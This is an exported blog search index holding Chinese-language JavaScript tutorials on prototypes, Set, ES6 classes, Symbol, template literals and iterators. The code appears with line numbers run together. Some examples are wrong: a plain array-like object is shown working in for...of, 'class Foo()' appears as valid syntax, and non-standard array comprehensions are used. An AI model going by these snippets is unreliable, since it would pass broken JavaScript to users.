=&#123;run:function()&#123; console.log("p is running...");&#125;&#125;;demo(p);//函数是一个类也是一个对象，函数调用对象就会执行起来。function F()&#123;&#125;;var f = new F();F.prototype.run = function()&#123;console.log("111");&#125;//原型区域，对象. 可以访问f.run();//111f.run = function()&#123;console.log("222");&#125;;//只是给f自己加了一个方法，没有改变类的原型对象，相当于方法的重写。f.什么都是给自己对象加的f.run();//222F.prototype.run();//111f.run = function()&#123;//run指向一个对象的地址 console.log("222"); F.prototype.run();//重写父的，并且还要调用父的，&#125;;f.run();//222 , 111=======================================================================function Parent()&#123; this.run = function()&#123;//现在把Parent当成类看，run是一个对象的地址， console.log("parent is running..."); &#125;&#125;function Child()&#123; Parent.call(this);//继承父的方法,相当于父有了一个run方法，this.run = function()&#123;console.log("parent is running...");&#125;，但是2个方法不是同一个，只是相当于把父的属性和方法在这里写了一遍。 var parentRun = this.run;//用this,parentRun指向run函数的地址， this.run = function ()&#123;//run重新指向，重写，添加同名的子类方法 console.log("child is running..."); parentRun();//地址名小括号就是对象的执行 &#125;&#125;var c = new Child();//Child看成是类，c是对象c.run();//run是函数的地址，地址小括号就是对象执行========================================================================function Parent()&#123; this.name = "333";//只能通过 对象.name 访问 var age = 34;//给嵌套函数使用&#125;var p = new Parent();console.log(p.name);//333console.log(Parent.name);//Parentconsole.log(p.age);//undefined, console.log(Parent.age);//undefined, Parent.aa = "aa"; //静态属性，对象. 访问不到，类. 访问得到Parent.prototype.aaa = "asa";//原型公有区域，对象. 访问得到，类. 访问不到console.log(p.aa);//undefined，console.log(Parent.aa);//aaconsole.log(p.aaa);//asa，console.log(Parent.aaa);//undefinedp.zz = "zz";//只是加给了对象自己，没有加给类和类的原型console.log(p.zz);//zzconsole.log(Parent.zz);//undefinedconsole.log(Parent.prototype.zz)//undefin==========================================================================function Parent()&#123;&#125;Parent.prototype.run = function() &#123; console.log("parent");&#125;;Child.prototype = Object.create(Parent.prototype);//继承Child.prototype.constructor = Child;//修正Child.super = Parent.prototype; //给Child增加静态属性function Child()&#123;&#125;Child.prototype.run=function()&#123; console.log('child is running...'); Child.super.run();&#125;var c = new Child();c.run(); 类里面的this.属性给对象用的，静态属性、方法给类用，什么都不加的和var给嵌套函数用，什么都不加的在window对象中。（静态属性、方法通过F.xx 添加） 对象的静态属性、方法给自己用。（静态属性、方法通过 p.xx 添加） 原型里面的属性、方法是给对象和原型自己用的。（通过 F.prototype.xx 添加） 123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;body&gt;&lt;script type="text/javascript"&gt; function F()&#123; this.name = "yw"; var age = 32; sch = 890; &#125; var f = new F(); alert(f.name);//yw alert(f.age);//undefined alert(f.sch);//undefined F.kr = "gh"; F.ss = function()&#123;alert(123);&#125; alert(f.kr);//undefined f.ss();//f.ss is not a function alert(F.prototype.kr);//undefined F.prototype.ss();//F.prototype.ss is not a function f.a = "a"; f.y = function()&#123;alert("y");&#125; alert(F.a);//undefined F.y();//F.y is not a function alert(F.prototype.a);//undefined F.prototype.y();//F.prototype.y is not a function F.prototype.o = "o"; F.prototype.oo = function()&#123;alert("oo");&#125; alert(f.o);//o f.oo();//oo alert(F.o);//undefined F.oo();//F.oo is not a function&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Set详解]]></title>
    <url>%2F2018%2F01%2F02%2Fset-and-map%2F</url>
    <content type="text"><![CDATA[Set Set 对象允许你存储任何类型的唯一值，无论是原始值或者是对象引用。 引用：官方文档 语法 1new Set([iterable]); 参数iterable如果传递一个可迭代对象，它的所有元素将被添加到新的 Set中。如果不指定此参数或其值为null，则新的Set为空。 返回值一个新的Set对象。 简述Set对象是值的集合，你可以按照插入的顺序迭代它的元素。 Set中的元素只会出现一次，即 Set 中的元素是唯一的。 值的相等因为 Set 中的值总是唯一的，所以需要判断两个值是否相等。在ECMAScript规范的早期版本中，这不是基于和===操作符中使用的算法相同的算法。具体来说，对于Set s， +0 （+0 严格相等于-0）和-0是不同的值。然而，在 ECMAScript 2015规范中这点已被更改。有关详细信息，请参阅浏览器兼容性 表中的“value equality for -0 and 0”。 另外，NaN和undefined都可以被存储在Set 中， NaN之间被视为相同的值（尽管 NaN !== NaN）。 属性Set.length:length属性的值为0。 get Set[@@species]:构造函数用来创建派生对象. Set.prototype:表示Set构造器的原型，允许向所有Set对象添加新的属性。 Set实例所有Set实例继承自 Set.prototype。 属性 属性 introduce Set.prototype.constructor 返回实例的构造函数。默认情况下是Set Set.prototype.size 返回Set对象的值的个数 方法 方法 introduce Set.prototype.add(value) 在Set对象尾部添加一个元素。返回该Set对象。 Set.prototype.clear() 移除Set对象内的所有元素。 Set.prototype.delete(value) 移除Set的中与这个值相等的元素，返回Set.prototype.has(value)在这个操作前会返回的值（即如果该元素存在，返回true，否则返回false）。Set.prototype.has(value)在此后会返回false。 Set.prototype.entries() 返回一个新的迭代器对象，该对象包含Set对象中的按插入顺序排列的所有元素的值的[value, value]数组。为了使这个方法和Map对象保持相似， 每个值的键和值相等。 Set.prototype.forEach(callbackFn[, thisArg]) 按照插入顺序，为Set对象中的每一个值调用一次callBackFn。如果提供了thisArg参数，回调中的this会是这个参数。 Set.prototype.has(value) 返回一个布尔值，表示该值在Set中存在与否。 Set.prototype.keys() 与values()方法相同，返回一个新的迭代器对象，该对象包含Set对象中的按插入顺序排列的所有元素的值。 Set.prototype.values() 返回一个新的迭代器对象，该对象包含Set对象中的按插入顺序排列的所有元素的值。 Set.prototype[@@iterator]() 返回一个新的迭代器对象，该对象包含Set对象中的按插入顺序排列的所有元素的值。 示例使用Set对象 12345678910111213141516171819202122232425let mySet = new Set();mySet.add(1); // Set(1) &#123;1&#125;mySet.add(5); // Set(2) &#123;1, 5&#125;mySet.add(5); // Set &#123; 1, 5 &#125;mySet.add("some text"); // Set(3) &#123;1, 5, "some text"&#125;var o = &#123;a: 1, b: 2&#125;;mySet.add(o);mySet.add(&#123;a: 1, b: 2&#125;); // o 指向的是不同的对象，所以没问题mySet.has(1); // truemySet.has(3); // falsemySet.has(5); // truemySet.has(Math.sqrt(25)); // truemySet.has("Some Text".toLowerCase()); // truemySet.has(o); // truemySet.size; // 5mySet.delete(5); // true, 从set中移除5mySet.has(5); // false, 5已经被移除mySet.size; // 4, 刚刚移除一个值console.log(mySet); // Set &#123;1, "some text", Object &#123;a: 1, b: 2&#125;, Object &#123;a: 1, b: 2&#125;&#125; Set不支持索引 1234arr.indexOf('a') !== -1 //慢//truesetOfWords.has('a') //快 //true 迭代Set 12345678910111213141516171819202122232425262728293031323334353637383940414243// 迭代整个set// 按顺序输出：1, "some text" for (let item of mySet) console.log(item);// 按顺序输出：1, "some text" for (let item of mySet.keys()) console.log(item);// 按顺序输出：1, "some text" for (let item of mySet.values()) console.log(item);// 按顺序输出：1, "some text" //(键与值相等)for (let [key, value] of mySet.entries()) console.log(key);// 转换Set为Array (with Array comprehensions)var myArr = [v for (v of mySet)]; // [1, "some text"]// 替代方案(with Array.from)var myArr = Array.from(mySet); // [1, "some text"]// 如果在HTML文档中工作，也可以：mySet.add(document.body);mySet.has(document.querySelector("body")); // true// Set 和 Array互换mySet2 = new Set([1,2,3,4]);mySet2.size; // 4[...mySet2]; // [1,2,3,4]// intersect can be simulated via var intersection = new Set([...set1].filter(x =&gt; set2.has(x))); // 新的迭代器对象// difference can be simulated viavar difference = new Set([...set1].filter(x =&gt; !set2.has(x)));// 用forEach迭代mySet.forEach(function(value) &#123; console.log(value);&#125;);// 1// 2// 3// 4 Array 相关 123456789var myArray = ["value1", "value2", "value3"];// 用Set构造器将Array转换为Setvar mySet = new Set(myArray);mySet.has("value1"); // returns true// 用...(展开操作符)操作符将Set转换为Arrayconsole.log([...mySet]); // 与myArray完全一致 String 相关 1234var text = 'Indiana';var mySet = new Set(text); // Set &#123;'I', 'n', 'd', 'i', 'a'&#125;mySet.size; // 5]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[class详解]]></title>
    <url>%2F2018%2F01%2F01%2Fclass%2F</url>
    <content type="text"><![CDATA[转载：http://www.cnblogs.com/E-WALKER/p/4796278.html Overview借助class 我们可以写出这样的代码: 12345678910111213141516171819202122232425class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125;class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); this.color = color; &#125; toString() &#123; return super.toString() + ' in ' + this.color; &#125;&#125;let cp = new ColorPoint(25, 8, 'green');cp.toString(); // '(25, 8) in green'console.log(cp instanceof ColorPoint); // trueconsole.log(cp instanceof Point); // true Base classes我们可以定义如下的class: 123456789class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125; 我们可以像使用ES5标准中的constructor一样实例化class 123var p = new Point(25, 8);p.toString();// '(25, 8)' 实际上，class还是用function实现的，并没有为js创造一个全新的class体系。 12typeof Point'function' 但是，与function相比，它是不能直接调用的，也就是说必须得new出来 12Point()TypeError: Classes can’t be function-called 另外，它不会像function一样会被hoisted(原因是语义阶段无法解析到extends的内容) 1234567foo(); // works, because `foo` is hoistedfunction foo() &#123;&#125;new Foo(); // ReferenceErrorclass Foo &#123;&#125; 123456789function functionThatUsesBar() &#123; new Bar();&#125;functionThatUsesBar(); // ReferenceErrorclass Bar &#123;&#125;functionThatUsesBar(); // OK 与函数一样，class的定义表达式也有两种，声明形式、表达式形式。之前用的都是声明形式，以下是表达式式的: 12345678910const MyClass = class Me &#123; getClassName() &#123; return Me.name; &#125;&#125;;let inst = new MyClass();console.log(inst.getClassName()); // Meconsole.log(Me.name); // ReferenceError: Me is not defined Inside the body of a class definitionclass定义体是只能包含方法，不能包含属性的(标准定义组织认为原型链中不应包含属性)，属性被写在constructor中。以下是三种会用到的方法(constructor 、static method、 prototype method)： 123456789101112class Foo &#123; constructor(prop) &#123; this.prop = prop; &#125; static staticMethod() &#123; return 'classy'; &#125; prototypeMethod() &#123; return 'prototypical'; &#125;&#125;let foo = new Foo(123); 如下图([[Prototype]]代表着继承关系)当对象被new出来，拿的是Foo.prototype : Object分支，从而可以调prototype method constructor，这个方法本身，代表了class 12Foo === Foo.prototype.constructor// true constructor有时被称为类构造器。相较于ES5，它可以调用父类的constructor(使用super())。static methods,它们归属于类本身，即类方法 1234typeof Foo.staticMethod'function'Foo.staticMethod()'classy' 关于 Getters and setters，它们的语法如下: 12345678910111213141516class MyClass &#123; get prop() &#123; return 'getter'; &#125; set prop(value) &#123; console.log('setter: '+value); &#125;&#125;let inst = new MyClass();inst.prop = 123;// setter: 123inst.prop//'getter' 方法名是可以动态生成的 123456789101112class Foo() &#123; myMethod() &#123;&#125;&#125;class Foo() &#123; ['my'+'Method']() &#123;&#125;&#125;const m = 'myMethod';class Foo() &#123; [m]() &#123;&#125;&#125; 增加了迭代器的支持，需要给方法前面加一个* 1234567891011121314151617class IterableArguments &#123; constructor(...args) &#123; this.args = args; &#125; * [Symbol.iterator]() &#123; for (let arg of this.args) &#123; yield arg; &#125; &#125;&#125;for (let x of new IterableArguments('hello', 'world')) &#123; console.log(x);&#125;// hello// world Subclassing通过extends，我们可以继承其它实现constructor的函数或对象。需要注意一下，constructor与非constructor调用父类方法的途径是不同的。 123456789101112131415161718192021222324252627282930class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125;class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); // (A) this.color = color; &#125; toString() &#123; return super.toString() + ' in ' + this.color; // (B) &#125;&#125;let cp = new ColorPoint(25, 8, 'green');cp.toString()'(25, 8) in green'cp instanceof ColorPoint// truecp instanceof Point// true 子类的原型就是它的父类 123Object.getPrototypeOf(ColorPoint) === Point// true 所以，static method也被继承了 12345678910class Foo &#123; static classMethod() &#123; return 'hello'; &#125;&#125;class Bar extends Foo &#123;&#125;Bar.classMethod(); // 'hello' static方法也是支持调用父类的。 123456789101112class Foo &#123; static classMethod() &#123; return 'hello'; &#125;&#125;class Bar extends Foo &#123; static classMethod() &#123; return super.classMethod() + ', too'; &#125;&#125;Bar.classMethod(); // 'hello, too' 关于子类中使用构造器，需要注意的是，调用this之前，需要调用super() 12345678910class Foo &#123;&#125; class Bar extends Foo &#123; constructor(num) &#123; let tmp = num * 2; // OK this.num = num; // ReferenceError super(); this.num = num; // OK &#125;&#125; constructors是可以被显示覆盖(override)的。 123456class Foo &#123; constructor() &#123; return Object.create(null); &#125;&#125;console.log(new Foo() instanceof Foo); // false Object.create() 方法会使用指定的原型对象及其属性去创建一个新的对象。Object.create() 如果基类中不显示定义constructor，引擎会生成如下代码 1constructor() &#123;&#125; 对于子类 123constructor(...args) &#123; super(...args);&#125; The details of classes 类名不能为eval 或者 arguments，不能有重复的类名，constructor不支持getter,setter。 classes不能像函数一样调用。 原型方法不能用作构造器： 1234class C &#123; m() &#123;&#125;&#125;new C.prototype.m(); // TypeError The details of subclassingES 6中,子类的使用方法如下: 1234567891011121314151617class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; ···&#125;class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); this.color = color; &#125; ···&#125;let cp = new ColorPoint(25, 8, 'green'); 原型链实现: 12345678910111213const getProto = Object.getPrototypeOf.bind(Object);getProto(Point) === Function.prototype// truegetProto(function () &#123;&#125;) === Function.prototype// truegetProto(Point.prototype) === Object.prototype// truegetProto(&#123;&#125;) === Object.prototype// true]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入解析 ES6：Symbol]]></title>
    <url>%2F2018%2F01%2F01%2Fsymbol%2F</url>
    <content type="text"><![CDATA[深入解析 ES6：Symbol 引用：http://bubkoo.com/2015/07/24/es6-in-depth-symbols/ Symbol 是什么？ 12typeof Symbol()"symbol" JavaScript 在 1997 年被标准化时，就有 6 种数据类型，直到 ES6 出现之前，程序中的变量一定是以下 6 种数据类型之一： Undefined Null Boolean Number String Object 而symbol则是javascript中的第七种数据类型 Symbol 是完全不一样的东西。一旦创建后就不可更改，不能对它们设置属性（如果在严格模式下尝试这样做，你将得到一个 TypeError）。它们可以作为属性名，这时它们和字符串的属性名没有什么区别。 每个 Symbol 都是独一无二的，不与其它 Symbol 重复（即便是使用相同的 Symbol 描述创建），创建一个 Symbol 就跟创建一个对象一样方便。 ES6 中的 Symbol与传统语言（如 Lisp 和 Ruby）中的 Symbol 中的类似，但并不是完全照搬到 JavaScript 中。在 Lisp 中，所有标识符都是 Symbol；在 JavaScript 中，标识符和大多数属性仍然是字符串，Symbol 只是提供了一个额外的选择。 值得注意的是：与其它类型不同的是，Symbol 不能自动被转换为字符串，当尝试将一个 Symbol 强制转换为字符串时，将返回一个 TypeError。 12345&gt; var sym = Symbol("&lt;3");&gt; "your symbol is " + sym// TypeError: can't convert symbol to string&gt; `your symbol is $&#123;sym&#125;`// TypeError: can't convert symbol to string 应该避免这样的强制转换，应该使用 String(sym) 或 sym.toString() 来转换。 获取 Symbol 的三种方法 Symbol() 每次调用时都返回一个唯一的 Symbol。 Symbol.for(string) 从 Symbol注册表中返回相应的 Symbol，与上个方法不同的是，Symbol注册表中的 Symbol 是共享的。也就是说，如果你调用 Symbol.for(&quot;cat&quot;) 三次，都将返回相同的 Symbol。当不同页面或同一页面不同模块需要共享 Symbol 时，注册表就非常有用。 Symbol.iterator 返回语言预定义的一些 Symbol，每个都有其特殊的用途。 如果你仍不确定 Symbol 是否有用，那么接下来的内容将非常有趣，因为我将为你演示 Symbol 的实际应用。 Symbol 在 ES6 规范中的应用 可以使用 Symbol 来避免代码冲突。 在使用 iterator 时，我们解析for (var item of myArray) 内部是以调用 myArray[Symbol.iterator]() 开始的，这个方法可以使用 myArray.iterator() 来代替，但是使用 Symbol 的后向兼容性更好。 在 ES6 中还有一些地方使用到了 Symbol。（这些特性还没有在 FireFox 中实现。） 使 instanceof 可扩展。在 ES6中，object instanceof constructor 表达式被标准化为构造函数的一个方法：constructor[Symbol.hasInstance](object)，这意味着它是可扩展的。 消除新特性和旧代码之间的冲突。 支持新类型的字符串匹配。在 ES5 中，调用 str.match(myObject) 时，首先会尝试将 myObject转换为 RegExp对象。在 ES6中，首先将检查 myObject中是否有 myObject[Symbol.match](str) 方法，在所有正则表达式工作的地方都可以提供一个自定义的字符串解析方法。 这些用途还比较窄，但仅仅通过我文章中的代码很难看到这些新特性产生的重大影响。JavaScript 的 Symbol 是 PHP 和 Python 中 __doubleUnderscores 的改进版本，标准组织将使用它来为语言添加新特性，而不会对已有代码产生影响。 案例一个布尔值引出的问题：有时，把一些属于其他对象的数据暂存在另一个对象中是非常方便的。例如，假设你正在编写一个 JS 库，使用 CSS 中的 transition 来让一个 DOM元素在屏幕上飞奔，你已经知道不能同时将多个 transition 应用在同一个 div上，否则将使得动画非常不美观，你也确实有办法来解决这个问题，但是首先你需要知道该 div是否已经在移动中。 怎么解决这个问题呢？ 其中一个方法是使用浏览器提供的 API 来探测元素是否处于动画状态，但杀鸡焉用牛刀，在将元素设置为移动时，你的库就知道了该元素正在移动。 你真正需要的是一种机制来跟踪哪些元素正在移动，你可以将正在移动的元素保存在一个数组中，每次要为一个元素设置动画时，首先检查一下这个元素是否已经在这个列表中。 啊哈，但是如果你的数组非常庞大，即便是这样的线性搜索也会产生性能问题。 那么，你真正想做的就是直接在元素上设置一个标志： 1234if (element.isMoving) &#123; smoothAnimations(element);&#125;element.isMoving = true; 这也有一些潜在的问题，不得不承认这样一个事实：还有其他代码也可能操作该 ODM 元素。 在其他代码中，你创建的属性会被 for-in 或 Object.keys() 枚举出来； 在其他一些库中也许已经使用了同样的方式（在元素上设置了相同的属性），那么这将和你的代码发生冲突，产生不可预计的结果； 其他一些库可能在将来会使用同样的方式，这也会与你的代码发生冲突； 标准委员会可能会为每个元素添加一个 .isMoving() 原生方法，那么你的代码就彻底不能工作了。 当然，对于最后三个问题，你可以选择一个无意义的不会有人会使用到的字符串： 1234if (element.__$jorendorff_animation_library$PLEASE_DO_NOT_USE_THIS_PROPERTY$isMoving__) &#123; smoothAnimations(element);&#125;element.__$jorendorff_animation_library$PLEASE_DO_NOT_USE_THIS_PROPERTY$isMoving__ = true; 这似乎太不靠谱了，看了让人眼睛痛。 你还可以用加密算法来生成一个几乎唯一的字符串： 1234567// get 1024 Unicode characters of gibberishvar isMoving = SecureRandom.generateName();...if (element[isMoving]) &#123; smoothAnimations(element);&#125;element[isMoving] = true; object[name] 语法允许我们将任何字符串作为属性名，代码能正常工作，冲突几乎是不可能了，代码看起来也美观多了。但是，这回导致糟糕的调试体验，每次使用 console.log() 打印出包含该属性的元素时，你回看到一个庞大的垃圾字符串，并且如果还不止一个这样的属性呢？每次刷新后属性名都发生了变化，怎么样使这些属性看起来更加直观呢？ 为什么这么难？我们只是为了保存一个小小的标志位。 用 Symbol 来解决问题 Symbol 值可以由程序创建，并可以作为属性名，而且不用担心属性名冲突。 1var mySymbol = Symbol(); 调用 Symbol() 方法将创建一个新的 Symbol 类型的值，并且该值不与其它任何值相等。与数字和字符串一样，Symbol 类型的值也可以作为对象的属性名，正是由于它不与任何其它值相等，对应的属性也不会发生冲突： 12obj[mySymbol] = "ok!"; // guaranteed not to collideconsole.log(obj[mySymbol]); // ok! 下面是使用 Symbol 来解决上面的问题： 1234567// create a unique symbolvar isMoving = Symbol("isMoving");...if (element[isMoving]) &#123; smoothAnimations(element);&#125;element[isMoving] = true; 上面代码需要注意几点： 方法 Symbol(&quot;isMoving&quot;) 中的 &quot;isMoving&quot; 字符串被称为 Symbol的描述信息，这对调试非常有帮助。可以通过 console.log(isMoving) 打印出来，或通过 isMoving.toString() 将 isMoving 转换为字符串时，或在一些错误信息中显示出来。 element[isMoving] 访问的是 symbol-keyed 属性，除了属性名是 Symbol 类型的值之外，与其它属性都一样。 和数组一样，symbol-keyed 属性不能通过 . 操作符来访问，必须使用方括号的方式。 操作 symbol-keyed 属性也非常方便，通过上面代码我们已经知道如何获取和设置 element[isMoving] 的值，我们还可以这样使用：if (isMoving in element) 或 delete element[isMoving]。 另一方面，只有在 isMoving 的作用域范围内才可以使用上述代码，这可以实现弱封装机制：在一个模块内创建一些Symbol，只有在该模块内部的对象才能使用，而不用担心与其它模块的代码发生冲突。 由于 Symbol 的设计初衷是为了避免冲突，当遍历 JavaScript对象时，并不会枚举到以 Symbol 作为建的属性，比如，for-in 循环只会遍历到以字符串作为键的属性，Object.keys(obj) 和 Object.getOwnPropertyNames(obj) 也一样，但这并不意味着 Symbol 为键的属性是不可枚举的：使用 Object.getOwnPropertySymbols(obj) 这个新方法可以枚举出来，还有 Reflect.ownKeys(obj) 这个新方法可以返回对象中所有字符串和 Symbol键。 库和框架的设计者将会发现很多 Symbol 的用途，JavaScript语言本身也对其有广泛的应用。 兼容性对于还没有原生支持 Symbol 的浏览器，你可以使用 polyfill，如 core.js，但该 polyfill 实现并不完美，请阅读注意事项。]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模板字符串]]></title>
    <url>%2F2018%2F01%2F01%2Fmo-ban-zi-fu-chuan%2F</url>
    <content type="text"><![CDATA[模板字符串 模板字面量/Template literals 是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。它们在ES2015规范的先前版本中被称为“模板字符串/template strings”。 语法 12345678`string text``string text line 1 string text line 2``string text $&#123;expression&#125; string text`tag `string text $&#123;expression&#125; string text` Note: 模板字面量也可以使用三元运算符( condition ? true : false ) 和 嵌套 nested！ 描述 模板字符串使用反引号 () 来代替普通字符串中的用双引号和单引号。 模板字符串可以包含特定语法(${expression})的占位符。 占位符中的表达式和周围的文本会一起传递给一个默认函数，该函数负责将所有的部分连接起来，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，你都可以通过该函数来对模板字符串进行操作处理。在模版字符串内使用反引号（`）时，需要在它前面加转义符（\）。 1`\`` === "`" // --&gt; true 多行字符串在新行中插入的任何字符都是模板字符串中的一部分，使用普通字符串，你可以通过以下的方式获得多行字符串： 1234console.log("string text line 1\n\string text line 2");// "string text line 1// string text line 2" 要获得同样效果的多行字符串，只需使用如下代码： 1234console.log(`string text line 1string text line 2`);// "string text line 1// string text line 2" 表达式插补在普通字符串中嵌入表达式，必须使用如下语法： 12345var a = 5;var b = 10;console.log("Fifteen is " + (a + b) + " and\nnot " + (2 * a + b) + ".");// "Fifteen is 15 and// not 20." 现在通过模板字符串，我们可以使用一种更优雅的方式来表示： 12345var a = 5;var b = 10;console.log(`Fifteen is $&#123;a + b&#125; and\nnot $&#123;2 * a + b&#125;.`);// "Fifteen is 15 and// not 20." 带标签的模板字符串更高级的形式的模板字面值被标记模板文本。标记使您可以分析模板文本功能。标记功能的第一个参数包含一个字符串值的数组。其余的参数是相关的表达式。最后，你的函数可以返回处理好的的字符串 （或者它可以返回完全不同的东西 , 如下例所述）。用于该标记的函数的名称可以被命名为任何你想要的东西。 12345678910111213141516171819202122232425262728var person = 'Mike';var age = 28;function myTag(strings, personExp, ageExp) &#123; var str0 = strings[0]; // "that " var str1 = strings[1]; // " is a " // 在技术上,有一个字符串在 // 最终的表达式 (在我们的例子中)的后面, // 但它是空的(""), 所以被忽略. // var str2 = strings[2]; var ageStr; if (ageExp &gt; 60)&#123; ageStr = 'old person'; &#125; else &#123; ageStr = 'young person'; &#125; return str0 + personExp + str1 + ageStr;&#125;var output = myTag`that $&#123; person &#125; is a $&#123; age &#125;`;console.log(output); // that Mike is a young person 12345678910111213141516171819202122232425262728//show函数采用rest参数的写法如下：let name = '张三', age = 20, message = show`我来给大家介绍:$&#123;name&#125;的年龄是$&#123;age&#125;.`;function show(stringArr,...values)&#123; let output =""; let index = 0 for(;index&lt;values.length;index++)&#123; output += stringArr[index]+values[index]; &#125; output += stringArr[index]; return output;&#125;message; //"我来给大家介绍:张三的年龄是20." 正如下面例子所展示的，标签函数并不一定需要返回一个字符串。 12345678910111213141516171819function template(strings, ...keys) &#123; return (function(...values) &#123; var dict = values[values.length - 1] || &#123;&#125;; var result = [strings[0]]; keys.forEach(function(key, i) &#123; var value = Number.isInteger(key) ? values[key] : dict[key]; result.push(value, strings[i + 1]); &#125;); return result.join(''); &#125;);&#125;var t1Closure = template`$&#123;0&#125;$&#123;1&#125;$&#123;0&#125;!`;t1Closure('Y', 'A'); // "YAY!" var t2Closure = template`$&#123;0&#125; $&#123;'foo'&#125;!`;t2Closure('Hello', &#123;foo: 'World'&#125;); // "Hello World!" 原始字符串在标签函数的第一个参数中，存在一个特殊的属性raw ，我们可以通过它来访问模板字符串的原始字符串。 123456function tag(strings, ...values) &#123; console.log(strings.raw[0]); // "string text line 1 \\n string text line 2"&#125;tag`string text line 1 \n string text line 2`; 另外，使用String.raw() 方法创建原始字符串和使用默认模板函数和字符串连接创建是一样的。 1String.raw`Hi\n$&#123;2+3&#125;!`; 浏览器兼容]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iterator 迭代器]]></title>
    <url>%2F2018%2F01%2F01%2Fiterator-die-dai-qi%2F</url>
    <content type="text"><![CDATA[iterator 迭代器引用：高鹏、Symbol.iterator 迭代器（Iterator）是一个接口，为各种不同的数据结构提供统一的访问机制。任何数据只要部署了 Iterator 接口，就可以完成遍历操作。 Symbol.iterator 属性的属性特性： 属性 属性特性 writable: false enumerable: false configurable: false 描述 当需要对一个对象进行迭代时（比如开始用于一个for..of循环中），它的@@iterator方法都会在不传参情况下被调用，返回的迭代器用于获取要迭代的值。 一些内置类型拥有默认的迭代器行为，其他类型（如 Object）则没有。下表中的内置类型拥有默认的@@iterator方法： Array.prototype@@iterator TypedArray.prototype@@iterator String.prototype@@iterator Map.prototype@@iterator Set.prototype@@iterator 作用 各种数据结构提供一个统一的、简便的访问接口； 使数据结构成员能够按某种次序排列； ES6 创造了一种新的遍历命令 for…of 循环，Iterator 接口主要供 for…of 消费 示例 自定义迭代器我们可以像下面这样创建自定义的迭代器： 1234567var myIterable = &#123;&#125;myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3;&#125;;[...myIterable] // [1, 2, 3] 不符合标准的迭代器如果一个迭代器 @@iterator 没有返回一个迭代器对象，那么它就是一个不符合标准的迭代器，这样的迭代器将会在运行期抛出异常，甚至非常诡异的 Bug。 123var nonWellFormedIterable = &#123;&#125;nonWellFormedIterable[Symbol.iterator] = () =&gt; 1[...nonWellFormedIterable] // TypeError: [] is not a function 就拿 for…of 语句来说，它首先调用被遍历对象的 Symbol.iterator 方法，该方法返回一个迭代器对象，迭代器对象可以是拥有 next 方法的任何对象。然后， 在 for…of 的每一次循环中，都将调用该迭代器对象上的 next 方法。每一次调用 next 方法，都会返回数据结构的当前成员信息。具体来说就是返回一个包含 value 和 done 两个属性的对象。其中 value 是当前成员的值，done 是一 个布尔值，表示遍历是否结束。 下面的代码实现了一个简单的迭代器对象： 12345678910111213141516171819202122232425262728var sampleIterator = &#123; index: 0, [Symbol.iterator]: function() &#123; return this &#125;, next: function() &#123; if (this.index &lt; 3) &#123; return &#123; done: false, value: this.index++ &#125; &#125; else &#123; return &#123; done: true, value: undefined &#125; &#125; &#125;&#125;for (var val of sampleIterator) &#123; console.log(val)&#125;// 结果为：// 0// 1// 2// [Finished in 2.7s] 上面的代码中，当使用 for…of 遍历 sampleIterator 时，首先调用了该对象的 [Symool.itirator] 方法，该方法返回对象本身。而该对象中包含有 next 方法，所以该对象本身就是一个 Iterator对象。可以供 for..of消费。当 this.index &gt;= 3 时，返回 {done: true, value: undefined}, 循环结束。 数据结构的默认 Iterator 接口 Iterator 接口的目的，就是为所有的数据结构提供一种统一的访问机制，即 for...of 循环。当使用 for…of 循环遍历某种数据结构时，该循环会自动去寻找 Iterator 接口。 ES6 规定，默认的 Iterator 接口就部署在数据结构的 Symbol.iterator 属性。调用该方法，就会得到当前数据结构默认的迭代器生成函数。 ES6 中，有三类数据结构原生具备 Iterator 接口：数组、类似数组的对象（如 NodeList ）、Set 和 Map 结构。 12345678910111213let arr = [1, 2, 4]// 迭代器接口部署在数组的 `Symbol.iterator` 属性上，调用该属性就可以得到迭代器对象（一个包含 next 函数的对象）var iterator = arr[Symbol.iterator]()console.log(iterator.next())console.log(iterator.next())console.log(iterator.next())console.log(iterator.next())// 输出结果：// &#123; value: 1, done: false &#125;// &#123; value: 2, done: false &#125;// &#123; value: 4, done: false &#125;// &#123; value: undefined, done: true &#125;// [Finished in 2.6s] 类似数组的对象（存在数值键名和 length 属性），可以直接在 Symbol.iterator 属性上部署数组的 Iterator 接口： 12345678910111213141516171819202122232425262728let iterable = &#123; 0: 'a', 1: 'b', 2: 'c', 3: 'd', length: 4,&#125;for (var item of iterable) &#123; console.log(item)&#125;// 输出结果：// a// b// c// d// [Finished in 2.6 s]// 如果 iterable 的 length 属性为 3：// a// b// c// [Finished in 2.7s]// 如果 iterable 的 length 属性为 5：// a// b// c// d// undefined// [Finished in 2.7s] 注：普通对象部署数组的 Symbol.iterator 方法，并没有效果。如果 Symbol.iterator 方法对应的不是遍历器生成函数，解释引擎会报错。 调用 Iterator 接口的场合除了 for…of 循环，还有几个场合会默认调用 Iterator 接口（即 Symbol.iterator). 